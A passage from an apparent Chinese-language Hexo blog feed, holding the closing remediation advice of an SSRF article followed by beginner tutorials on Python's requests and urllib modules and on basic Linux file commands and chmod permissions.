rel="noopener">SSRF漏洞的利用与攻击内网应用实战</a><br><strong>2.</strong> <a href="https://mp.weixin.qq.com/s?__biz=MzI4NTE4NDAyNA==&mid=2650383259&idx=1&sn=68a01c433d744e94ebc14d568e2ac174&chksm=f3fd1aecc48a93fa27183525f9593efb43a172d1af2c690818cbda7d85a6334879a1b4df2bd6&scene=21#wechat_redirect" target="_blank" rel="noopener">Web安全基础学习之SSRF漏洞利用及绕过方式</a><br><strong>3.</strong><a href="https://mp.weixin.qq.com/s/ZL91c2YnHbIu75KG20eBJA" target="_blank" rel="noopener">挖洞达人必杀技之SSRF漏洞的利用与攻击内网应用实战</a></p><h2 id="0x03-修复方式"><a href="#0x03-修复方式" class="headerlink" title="0x03 修复方式"></a>0x03 修复方式</h2><p><strong>1.</strong>限制请求的端口，只能为web端口，只允许访问http 和 https的请求<br><strong>2.</strong>限制不能访问内网ip，以防止对内网进行攻击<br><strong>3.</strong>屏蔽 返回的详细信息</p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python中request模块的基本使用</title>
      <link href="/2020/032030464.html"/>
      <url>/2020/032030464.html</url>
      
        <content type="html"><![CDATA[<h2 id="Requests库的基础使用"><a href="#Requests库的基础使用" class="headerlink" title="Requests库的基础使用"></a>Requests库的基础使用</h2><p><strong>Get/Post请求</strong> </p><p>Get请求</p><pre class=" language-python"><code class="language-python"> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">,</span>参数<span class="token punctuation">)</span>        </code></pre><p>Post请求</p><pre class=" language-python"><code class="language-python"> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">,</span>参数<span class="token punctuation">)</span></code></pre><h3 id="0x01-响应体内容"><a href="#0x01-响应体内容" class="headerlink" title="0x01 .响应体内容"></a>0x01 .响应体内容</h3><table><thead><tr><th>用法</th><th>解释</th></tr></thead><tbody><tr><td><code>r.encoding</code></td><td>获取当前编码</td></tr><tr><td><code>r.encoding = ‘utf-8’</code></td><td>设置编码</td></tr><tr><td><code>r.text</code></td><td>以encoding解析返回内容。字符串方式的响应体，会根据响应头部的字符编码进行解码</td></tr><tr><td><code>r.content</code></td><td>以字节（二进制）返回。字节方式的响应体会自动为你解码gzip和deflate压缩</td></tr><tr><td><code>r.headers</code></td><td>以字典对象存储服务器响应头，但是字典比较特殊，字典键不区分大小写，若键不存在，则返回None</td></tr><tr><td><code>r.status_code</code></td><td>响应状态码 <em>特殊方法</em></td></tr><tr><td><code>r.json()</code></td><td>Requests 中内置的json解码器，以json形式返回内容，确保json格式，不然解析出错会抛异常</td></tr><tr><td><code>r.raise_for_status()</code></td><td>失败请求(非200响应) 抛出异常</td></tr></tbody></table><h3 id="0x02-进阶应用"><a href="#0x02-进阶应用" class="headerlink" title="0x02. 进阶应用"></a>0x02. 进阶应用</h3><p><strong>1.定制header/cookies 内容</strong></p><pre class=" language-python"><code class="language-python">header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'user-agent'</span><span class="token punctuation">:</span><span class="token string">'User-Agent: Mozilla/5.0'</span><span class="token punctuation">}</span>cookie <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span><span class="token string">'值'</span><span class="token punctuation">}</span>r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token operator">/</span>post<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span></code></pre><p><strong>2.设置http代理</strong></p><pre class=" language-python"><code class="language-python">proxies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'http'</span><span class="token punctuation">:</span><span class="token string">'120.79.212.174'</span><span class="token punctuation">,</span><span class="token string">'https'</span><span class="token punctuation">:</span><span class="token string">'60.167.20.246'</span><span class="token punctuation">}</span>baidu <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span></code></pre><p>如果需要用户名密码验证</p><pre class=" language-python"><code class="language-python">proxies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'http'</span><span class="token punctuation">:</span><span class="token string">'username:password@120.79.212.174'</span><span class="token punctuation">}</span>baidu <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span></code></pre><p><strong>3.基础身份认证</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> requests<span class="token punctuation">.</span>auth <span class="token keyword">import</span> HTTPBasicAuthurl <span class="token operator">=</span> <span class="token string">'https://qiyuanxuetang.net/hidden-basic-auth/user/passwd'</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>auth<span class="token operator">=</span>HTTPBasicAuth<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span><span class="token string">'passwd'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># r = requests.get(url=url,auth=('user','passwd') //简写</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="0x03-推荐阅读文章"><a href="#0x03-推荐阅读文章" class="headerlink" title="0x03.推荐阅读文章"></a>0x03.推荐阅读文章</h3><ol><li><a href="https://blog.csdn.net/qq_29286967/article/details/81025237" target="_blank" rel="noopener">request模块的深入和使用</a></li><li><a href="https://blog.csdn.net/weixin_44494778/article/details/93709582" target="_blank" rel="noopener">request基本使用</a><br>也可以看看官方解释</li></ol>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>urllib3模块的基本使用</title>
      <link href="/2020/032048346.html"/>
      <url>/2020/032048346.html</url>
      
        <content type="html"><![CDATA[<h2 id="urllib3模块的基本使用"><a href="#urllib3模块的基本使用" class="headerlink" title="urllib3模块的基本使用"></a>urllib3模块的基本使用</h2><hr>简单的请求get请求<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib3http <span class="token operator">=</span> urllib3<span class="token punctuation">.</span>PoolManager<span class="token punctuation">(</span><span class="token punctuation">)</span>baidu <span class="token operator">=</span> http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>baidu<span class="token punctuation">.</span>status<span class="token punctuation">)</span></code></pre><p>post请求</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib3http <span class="token operator">=</span> urllib3<span class="token punctuation">.</span>PoolManager<span class="token punctuation">(</span><span class="token punctuation">)</span>baidu <span class="token operator">=</span> http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>baidu<span class="token punctuation">.</span>status<span class="token punctuation">)</span></code></pre><h2 id="urllib3的其他拓展"><a href="#urllib3的其他拓展" class="headerlink" title="urllib3的其他拓展"></a>urllib3的其他拓展</h2><hr>### 1、最简单<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestresponse <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://python.org/'</span><span class="token punctuation">)</span>html <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="2、使用-Request"><a href="#2、使用-Request" class="headerlink" title="2、使用 Request"></a>2、使用 Request</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestreq <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span><span class="token string">'http://python.org/'</span><span class="token punctuation">)</span>response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>the_page <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="3、发送数据"><a href="#3、发送数据" class="headerlink" title="3、发送数据"></a>3、发送数据</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requesturl <span class="token operator">=</span> <span class="token string">'http://localhost/login.php'</span>user_agent <span class="token operator">=</span> <span class="token string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span>values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'act'</span> <span class="token punctuation">:</span> <span class="token string">'login'</span><span class="token punctuation">,</span><span class="token string">'login[email]'</span> <span class="token punctuation">:</span> <span class="token string">'yzhang@i9i8.com'</span><span class="token punctuation">,</span><span class="token string">'login[password]'</span> <span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">}</span>data <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span>req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'Referer'</span><span class="token punctuation">,</span> <span class="token string">'http://www.python.org/'</span><span class="token punctuation">)</span>response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>the_page <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>the_page<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="4、发送数据和header"><a href="#4、发送数据和header" class="headerlink" title="4、发送数据和header"></a>4、发送数据和header</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requesturl <span class="token operator">=</span> <span class="token string">'http://localhost/login.php'</span>user_agent <span class="token operator">=</span> <span class="token string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span>values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'act'</span> <span class="token punctuation">:</span> <span class="token string">'login'</span><span class="token punctuation">,</span><span class="token string">'login[email]'</span> <span class="token punctuation">:</span> <span class="token string">'yzhang@i9i8.com'</span><span class="token punctuation">,</span><span class="token string">'login[password]'</span> <span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">}</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'User-Agent'</span> <span class="token punctuation">:</span> user_agent <span class="token punctuation">}</span>data <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span>req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> headers<span class="token punctuation">)</span>response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>the_page <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>the_page<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="5、http-错误"><a href="#5、http-错误" class="headerlink" title="5、http 错误"></a>5、http 错误</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestreq <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span><span class="token string">'http://www.111cn.net '</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>HTTPError <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>code<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="6、异常处理1"><a href="#6、异常处理1" class="headerlink" title="6、异常处理1"></a>6、异常处理1</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> Request<span class="token punctuation">,</span> urlopen<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>error <span class="token keyword">import</span> URLError<span class="token punctuation">,</span> HTTPErrorreq <span class="token operator">=</span> Request<span class="token punctuation">(</span><span class="token string">"http://www.111cn.net /"</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>response <span class="token operator">=</span> urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">except</span> HTTPError <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The server couldn'</span>t fulfill the request<span class="token punctuation">.</span>'<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error code: '</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>code<span class="token punctuation">)</span><span class="token keyword">except</span> URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'We failed to reach a server.'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Reason: '</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"good!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="7、异常处理2"><a href="#7、异常处理2" class="headerlink" title="7、异常处理2"></a>7、异常处理2</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> Request<span class="token punctuation">,</span> urlopen<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>error <span class="token keyword">import</span>  URLErrorreq <span class="token operator">=</span> Request<span class="token punctuation">(</span><span class="token string">"http://www.111cn.net /"</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>response <span class="token operator">=</span> urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">except</span> URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token string">'reason'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'We failed to reach a server.'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Reason: '</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span><span class="token keyword">elif</span> hasattr<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The server couldn'</span>t fulfill the request<span class="token punctuation">.</span>'<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error code: '</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>code<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"good!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="8、HTTP-认证"><a href="#8、HTTP-认证" class="headerlink" title="8、HTTP 认证"></a>8、HTTP 认证</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token comment" spellcheck="true"># create a password manager</span>password_mgr <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>HTTPPasswordMgrWithDefaultRealm<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Add the username and password.</span><span class="token comment" spellcheck="true"># If we knew the realm, we could use it instead of None.</span>top_level_url <span class="token operator">=</span> <span class="token string">"https://www.111cn.net /"</span>password_mgr<span class="token punctuation">.</span>add_password<span class="token punctuation">(</span>None<span class="token punctuation">,</span> top_level_url<span class="token punctuation">,</span> <span class="token string">'rekfan'</span><span class="token punctuation">,</span> <span class="token string">'xxxxxx'</span><span class="token punctuation">)</span>handler <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>HTTPBasicAuthHandler<span class="token punctuation">(</span>password_mgr<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># create "opener" (OpenerDirector instance)</span>opener <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># use the opener to fetch a URL</span>a_url <span class="token operator">=</span> <span class="token string">"https://www.111cn.net /"</span>x <span class="token operator">=</span> opener<span class="token punctuation">.</span>open<span class="token punctuation">(</span>a_url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Install the opener.</span><span class="token comment" spellcheck="true"># Now all calls to urllib.request.urlopen use our opener.</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>install_opener<span class="token punctuation">(</span>opener<span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>a_url<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><h3 id="9、使用代理"><a href="#9、使用代理" class="headerlink" title="9、使用代理"></a>9、使用代理</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python3</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestproxy_support <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>ProxyHandler<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'sock5'</span><span class="token punctuation">:</span> <span class="token string">'localhost:1080'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>opener <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span>proxy_support<span class="token punctuation">)</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>install_opener<span class="token punctuation">(</span>opener<span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://www.111cn.net "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><h3 id="10、超时"><a href="#10、超时" class="headerlink" title="10、超时"></a>10、超时</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token comment" spellcheck="true"># timeout in seconds</span>timeout <span class="token operator">=</span> <span class="token number">2</span>socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># this call to urllib.request.urlopen now uses the default timeout</span><span class="token comment" spellcheck="true"># we have set in the socket module</span>req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span><span class="token string">'http://www.111cn.net /'</span><span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><h2 id="urllib3推荐文章"><a href="#urllib3推荐文章" class="headerlink" title="urllib3推荐文章"></a>urllib3推荐文章</h2><hr><p>因为我没怎么经常用urllib3这个模块<br>所以推荐一下别人的文章，写的不错</p><ol><li><a href="https://www.jianshu.com/p/d2f093ac01d6" target="_blank" rel="noopener">urllib和urllib3的使用</a></li><li><a href="https://www.cnblogs.com/springsnow/p/12118558.html" target="_blank" rel="noopener">Python HTTP客户端模块urllib、urllib3、requests库</a></li><li><a href="https://www.pianshen.com/article/820125448/" target="_blank" rel="noopener">python3下 urllib常用模块</a></li></ol><p>这三篇文章特别详细，比其他地方好多了<br>（<em>先保存，因为要写个自动化信息收集的工具，又要上班<br>果断时间再回来看</em>）</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令（二）</title>
      <link href="/2020/031748230.html"/>
      <url>/2020/031748230.html</url>
      
        <content type="html"><![CDATA[<h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><hr><h3 id="0x01-cat命令"><a href="#0x01-cat命令" class="headerlink" title="0x01 . cat命令"></a><code>0x01</code> . cat命令</h3><blockquote><p>cat命令用于查看纯文本文件（内容较少的），格式为“cat [选项] [文件]”。 如图，继上一篇里面我的创建文档，</p></blockquote><blockquote><p>里面只有hello world单词</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204341704.png" alt></p><h3 id="0x02-more命令"><a href="#0x02-more命令" class="headerlink" title="0x02. more命令"></a><code>0x02</code>. more命令</h3><blockquote><p>more命令用于查看纯文本文件（内容较多的），格式为“more [选项]文件”。 刚好昨天我昨天对6个网站进行nmap探测</p></blockquote><blockquote><p>这时候可以用more命令查看</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204520717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt></p><h3 id="0x03-head命令"><a href="#0x03-head命令" class="headerlink" title="0x03. head命令"></a><code>0x03</code>. head命令</h3><blockquote><p>head命令用于查看纯文本文档的前N行，格式为“head [选项] [文件]”。</p><p>head -n 3 url.txt   就会看到前3行的url，文件里有6行url</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204600646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt></p><h3 id="0x04-wc命令"><a href="#0x04-wc命令" class="headerlink" title="0x04. wc命令"></a><code>0x04</code>. wc命令</h3><blockquote><p>wc命令用于统计指定文本的行数、字数、字节数，格式为“wc [参数] 文本”。 </p></blockquote><blockquote><p>wc –help  就可以查看具体参数了</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204633754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt></p><h3 id="0x05-stat命令"><a href="#0x05-stat命令" class="headerlink" title="0x05.stat命令"></a><code>0x05</code>.stat命令</h3><blockquote><p>stat命令用于查看文件的具体存储信息和时间等信息，格式为“stat 文件名称”</p></blockquote><blockquote><p>stat hello.txt   操作简单，一看就懂</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020031720470926.png" alt></p><h3 id="0x06-touch命令"><a href="#0x06-touch命令" class="headerlink" title="0x06. touch命令"></a><code>0x06</code>. touch命令</h3><blockquote><p>touch命令用于创建空白文件或设置文件的时间，</p><p>格式为<code>touch [选项] [文件]</code></p></blockquote><blockquote><p>写py的时候也可以这样创建个文件</p></blockquote><h3 id="0x07-mkdir命令"><a href="#0x07-mkdir命令" class="headerlink" title="0x07. mkdir命令"></a><code>0x07</code>. mkdir命令</h3><blockquote><p>mkdir命令用于创建空白的目录，格式为“mkdir [选项] 目录”。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204815429.png" alt></p><h3 id="0x08-cp命令"><a href="#0x08-cp命令" class="headerlink" title="0x08.cp命令"></a><code>0x08</code>.cp命令</h3><blockquote><p>cp命令用于复制文件或目录，<br>格式为“<code>cp [选项] 源文件 目标文件</code>”。<br> 随便 cp hello.txt    或者复制目录 cp love</p></blockquote><h3 id="0x09-mv命令"><a href="#0x09-mv命令" class="headerlink" title="0x09. mv命令"></a><code>0x09</code>. mv命令</h3><blockquote><p>mv命令用于移动文件或将文件重命名</p></blockquote><blockquote><p>格式为“mv [选项] 源文件 [目标路径|目标文件名]”。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204911329.png" alt></p><h3 id="0x10-file命令"><a href="#0x10-file命令" class="headerlink" title="0x10. file命令"></a><code>0x10</code>. file命令</h3><blockquote><p>file命令用于查看文件的类型，格式为“file 文件名”。</p></blockquote><h3 id="0x11-tar命令"><a href="#0x11-tar命令" class="headerlink" title="0x11. tar命令"></a><code>0x11</code>. tar命令</h3><blockquote><p>tar命令用于对文件进行打包压缩或解压，格式为“tar [选项] [文件]”。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200317204957177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt></p><h3 id="0x12-find命令"><a href="#0x12-find命令" class="headerlink" title="0x12. find命令"></a><code>0x12</code>. find命令</h3><blockquote><p>find命令用于按照指定条件来查找文件，格式为“find [查找路径] 寻找条件 操作”</p></blockquote><h2 id="使用chmod命令进行文件的权限修改"><a href="#使用chmod命令进行文件的权限修改" class="headerlink" title="使用chmod命令进行文件的权限修改"></a><code>使用chmod命令进行文件的权限修改</code></h2><p><code>chmod [选项] &lt;模式,模式...&gt; &lt;文件名...&gt;</code></p><p>文件和目录的权限<br>linux中文件和目录的权限有所不同</p><p><strong>文件的权限:</strong><br>r 可以读文件       数值为  4<br>w 可以写文件  数值为 2<br>x 可以执行文件  数值为1</p><p><strong>目录的权限:</strong></p><p><code>xr</code> 可以读取（cp）和查看（ls）目录的内容（即文件和目录），同时还需要可执行权限</p><p><code>xw</code> 可以在目录里创建文件（touch）和目录（mkdir）和删除文件（rm）和目录（rmdir），同时还需要可执行权限</p><p><code>xx</code> 可以进入目录（cd）和执行文件 实践过程 </p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令</title>
      <link href="/2020/031711755.html"/>
      <url>/2020/031711755.html</url>
      
